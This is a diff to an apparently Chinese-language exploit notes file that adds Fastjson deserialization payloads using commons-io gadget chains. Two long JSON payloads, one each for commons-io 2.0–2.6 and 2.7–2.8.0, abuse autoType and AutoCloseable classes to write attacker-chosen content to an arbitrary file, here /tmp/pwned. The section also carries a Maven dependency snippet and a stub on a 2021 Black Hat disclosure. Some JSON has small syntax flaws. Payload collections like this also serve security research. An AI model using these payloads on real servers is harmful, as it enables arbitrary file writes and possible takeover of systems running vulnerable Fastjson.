@@ -867,6 +867,187 @@ cat test.txt | openssl zlib | base64 -w 0
     'protocolVersion':1
 }
 ```
+commons-io 组件写文件
+
+https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg
+
+```xml
+<!-- https://mvnrepository.com/artifact/commons-io/commons-io -->
+<dependency>
+    <groupId>commons-io</groupId>
+    <artifactId>commons-io</artifactId>
+    <version>2.8.0</version>
+</dependency>
+
+```
+commons-io 2.0 - 2.6
+```json
+
+{
+  "x":{
+    "@type":"com.alibaba.fastjson.JSONObject",
+    "input":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.ReaderInputStream",
+      "reader":{
+        "@type":"org.apache.commons.io.input.CharSequenceReader",
+        "charSequence":{"@type":"java.lang.String""aaaaaa...(长度要大于8192，实际写入前8192个字符)"
+      },
+      "charsetName":"UTF-8",
+      "bufferSize":1024
+    },
+    "branch":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.output.WriterOutputStream",
+      "writer":{
+        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
+        "file":"/tmp/pwned",
+        "encoding":"UTF-8",
+        "append": false
+      },
+      "charsetName":"UTF-8",
+      "bufferSize": 1024,
+      "writeImmediately": true
+    },
+    "trigger":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "is":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+    "trigger2":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "is":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+    "trigger3":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "is":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    }
+  }
+}
+```
+commons-io 2.7 - 2.8.0 
+```json
+
+{
+  "x":{
+    "@type":"com.alibaba.fastjson.JSONObject",
+    "input":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.ReaderInputStream",
+      "reader":{
+        "@type":"org.apache.commons.io.input.CharSequenceReader",
+        "charSequence":{"@type":"java.lang.String""aaaaaa...(长度要大于8192，实际写入前8192个字符)",
+        "start":0,
+        "end":2147483647
+      },
+      "charsetName":"UTF-8",
+      "bufferSize":1024
+    },
+    "branch":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.output.WriterOutputStream",
+      "writer":{
+        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
+        "file":"/tmp/pwned",
+        "charsetName":"UTF-8",
+        "append": false
+      },
+      "charsetName":"UTF-8",
+      "bufferSize": 1024,
+      "writeImmediately": true
+    },
+    "trigger":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "inputStream":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+    "trigger2":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "inputStream":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+    "trigger3":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "inputStream":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    }
+  }
+```
+
 2021黑帽大会腾讯玄武披露   
 详细漏洞原理待研究
 ```java
